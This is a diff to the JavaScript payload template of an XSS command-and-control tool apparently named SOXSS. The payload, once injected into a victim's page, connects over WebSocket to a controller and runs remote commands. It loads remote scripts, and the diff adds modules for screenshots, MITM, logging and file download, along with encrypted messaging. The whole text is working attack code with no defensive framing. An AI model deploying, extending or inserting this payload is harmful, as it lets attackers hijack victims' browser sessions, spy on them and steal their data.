@@ -1,6 +1,46 @@
 var webSocket = window.__SOXSS_SOCKET__ || null;
 var httpBase = "$hbase";
 var wsBase = "$wsbase";
+var mitmHost = "$mhost";
+var mitmPort = "$mport";
+
+function normalizeRuntimePort(protocol, port) {
+    if (port) {
+        return String(port);
+    }
+    return protocol === 'https:' ? '443' : '80';
+}
+
+function isMitmOrigin() {
+    if (!mitmHost) {
+        return false;
+    }
+
+    const runtimeHost = (window.location.hostname || '').toLowerCase();
+    const targetHost = String(mitmHost).toLowerCase();
+    if (runtimeHost !== targetHost) {
+        return false;
+    }
+
+    if (!mitmPort) {
+        return true;
+    }
+
+    const runtimePort = normalizeRuntimePort(window.location.protocol, window.location.port);
+    return runtimePort === String(mitmPort);
+}
+
+// Default Scripts to load after the WebSocket connection is established
+
+function loadDefaultScripts() {
+    loadScriptFromURL(httpBase + 'scripts/screenshot.js');
+    loadScriptFromURL(httpBase + 'scripts/html2canvas.min.js');
+    loadScriptFromURL(httpBase + 'scripts/mitm.js');
+    loadScriptFromURL(httpBase + 'scripts/logger.js');
+    loadScriptFromURL(httpBase + 'scripts/link2fetch.js');
+    loadScriptFromURL(httpBase + 'scripts/downloadFile.js');
+    console.info("Default scripts loaded.");
+}
 
 function sendMessage(msg) {
     if (!webSocket || webSocket.readyState !== 1) {
@@ -19,10 +59,10 @@ function loadScriptFromURL(url) {
     return new Promise((resolve, reject) => {
         var script = document.createElement("script");
         script.src = url;
-        script.onload = function() {
+        script.onload = function () {
             resolve(true);
         };
-        script.onerror = function() {
+        script.onerror = function () {
             reject(false);
         };
         document.getElementsByTagName("head")[0].appendChild(script);
@@ -37,6 +77,10 @@ function loadScript(script) {
 
 if (window.__SOXSS_BOOTSTRAPPED__) {
     console.info("SOXSS payload already active in this page context.");
+    loadDefaultScripts();
+} else if (isMitmOrigin()) {
+    console.info("SOXSS websocket connection blocked on MITM origin.");
+    window.__SOXSS_BOOTSTRAPPED__ = true;
 } else {
     window.__SOXSS_BOOTSTRAPPED__ = true;
     webSocket = new WebSocket(wsBase + "/$sid");
@@ -46,17 +90,18 @@ if (window.__SOXSS_BOOTSTRAPPED__) {
         // Dynamically load CryptoJS from CDN
         var cryptoScript = document.createElement("script");
         cryptoScript.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
-        cryptoScript.onload = function() {
+        cryptoScript.onload = function () {
             if (initCrypto()) {
                 sendMessage({ type: 1 });
             }
         };
-        cryptoScript.onerror = function() {
+        cryptoScript.onerror = function () {
             // Keep connection alive and report load failure through backend once possible.
             console.error("CryptoJS could not be loaded from CDN.");
         };
         document.getElementsByTagName("head")[0].appendChild(cryptoScript);
     };
+    loadDefaultScripts();
 }
 
 /* Esta es un diccionario de tipo {"string":function}, la string es el Commando que recibirá el onmessage, la función será el Commando.
@@ -78,10 +123,10 @@ var _webs_Commands_ = {
         // Check if it's a URL (starts with http or https)
         if (/(http(s?)):\/\//i.test(scriptContent)) {
             loadScriptFromURL(scriptContent)
-                .then(function(ok) {
+                .then(function (ok) {
                     sendMessage({ type: 0, msg: { outputType: "info", text: "loaded" } })
                 })
-                .catch(function(err) {
+                .catch(function (err) {
                     sendMessage({ type: 0, msg: { outputType: "error", text: "could not load " + scriptContent } })
                 })
         } else {
@@ -117,13 +162,14 @@ if (webSocket && !webSocket.onmessage) {
 
 // Criptografía
 
-var secretKey = "$key";
-var derived_key = null;
-var useCrypto = false;
-
-// Initialize the initialization vector (IV) and encryption mode
-var iv = null;
-var encryptionOptions = null;
+if (!derived_key) {
+    var secretKey = "$key";
+    var derived_key = null;
+    var useCrypto = false;
+    // Initialize the initialization vector (IV) and encryption mode
+    var iv = null;
+    var encryptionOptions = null;
+}
 
 function initCrypto() {
     if (typeof CryptoJS === "undefined") {
@@ -168,3 +214,4 @@ function hex2a(hexx) {
         str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
     return str;
 }
+
